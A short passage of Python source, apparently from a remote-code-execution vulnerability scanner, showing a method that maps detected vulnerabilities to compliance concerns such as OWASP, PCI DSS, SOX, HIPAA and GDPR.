                return "high"
        
        return "medium"
    
    def _assess_compliance_impact(self, results: Dict[str, Any]) -> List[str]:
        """Assess compliance impact of RCE vulnerabilities"""
        impacts = []
        
        if results['vulnerabilities']:
            impacts.extend([
                "OWASP Top 10 A03:2021 - Injection vulnerability",
                "PCI DSS - Immediate remediation required for payment systems",
                "SOX - Financial data integrity at risk",
                "HIPAA - Patient data confidentiality compromised",
                "GDPR - Personal data processing security breach"
            ])
        
        return impacts
